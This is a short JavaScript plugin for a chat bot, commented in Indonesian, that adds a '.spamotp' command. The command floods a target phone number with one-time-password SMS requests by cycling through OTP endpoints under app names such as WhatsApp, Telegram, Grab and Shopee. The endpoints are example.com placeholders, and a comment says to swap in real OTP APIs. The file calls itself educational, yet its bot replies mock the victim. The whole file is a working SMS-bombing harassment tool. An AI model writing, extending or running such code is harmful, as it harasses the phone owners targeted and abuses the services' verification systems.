// Plugin: Spam OTP
// Simulasi request OTP ke nomor target via API publik
// Hanya untuk testing/edukasi

import axios from 'axios';

export default {
  name: 'spamotp',
  description: 'Spam OTP ke nomor target',
  usage: '.spamotp <nomor> <jumlah>',
  async execute(m, { args, client }) {
    const target = args[0]?.replace(/[^0-9]/g, '');
    const count = parseInt(args[1]) || 10;

    if (!target) return m.reply('Nomor target kosong. Otak lo kosong juga?');

    const otpApis = [
      'https://api.otpsimulasi.example.com/send', // Ganti dengan API OTP sendiri
      'https://api.otpkedua.example.com/request',
      'https://api.otpketiga.example.com/generate'
    ];

    let sent = 0;
    m.reply(`Spam OTP ke ${target} sebanyak ${count}x. Semoga HP dia gak meledak.`);

    for (let i = 0; i < count; i++) {
      const api = otpApis[i % otpApis.length];
      try {
        await axios.post(api, {
          phone: target,
          type: 'sms',
          app: ['wa', 'telegram', 'grab', 'shopee'][i % 4],
          timestamp: Date.now()
        }, { timeout: 5000 });
        sent++;
        console.log(`[OTP] Request ${i + 1} sukses via ${api}`);
      } catch (e) {
        console.log(`[OTP] Gagal request ${i + 1}: ${e.message}`);
      }
      await new Promise(r => setTimeout(r, 2000));
    }

    m.reply(`Selesai. ${sent}/${count} OTP terkirim ke ${target}. Cek HP dia, pasti rame.`);
  }
};
